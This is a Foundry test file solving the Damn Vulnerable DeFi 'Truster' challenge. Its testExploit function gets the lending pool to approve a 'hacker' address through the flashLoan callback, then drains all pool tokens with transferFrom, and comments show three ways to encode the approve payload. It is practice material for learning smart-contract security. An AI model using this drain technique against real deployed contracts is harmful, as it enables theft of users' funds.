// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import "src/Truster/TrusterLenderPool.sol";

// Challenge #3 - Truster
// https://www.damnvulnerabledefi.xyz/challenges/truster/

contract Attack is Test {
    DamnValuableToken public token;
    TrusterLenderPool public pool;

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant TOKENS_IN_POOL = 1000000 * 1e18;

    function setUp() public {
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(DamnValuableToken(address(token)));

        token.transfer(address(pool), TOKENS_IN_POOL);
    }

    function testInit() public {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(hacker), 0);
    }

    function testExploit() public {
        // Attack Code:

        // ------ encode_idea1: 直接去 https://abi.hashex.org/ 编码完传进去
        // bytes memory data =
        //     hex"095ea7b30000000000000000000000004a6f6e8a8433e06cb3ce41be74ba4bcb074c628200000000000000000000000000000000000000000000d3c21bcecceda1000000";
        // ------ encode_idea2: By abi.encodeWithSelector()
        // bytes4 approveSelector = bytes4(keccak256(bytes("approve(address,uint256)")));
        // bytes memory data = abi.encodeWithSelector(approveSelector, hacker, TOKENS_IN_POOL);
        // ------ encode_idea3: By abi.encodeWithSignature()
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", hacker, TOKENS_IN_POOL);

        pool.flashLoan(0, hacker, address(token), data);

        vm.startPrank(hacker);
        token.transferFrom(address(pool), hacker, TOKENS_IN_POOL);
        vm.stopPrank();

        assertEq(token.balanceOf(hacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
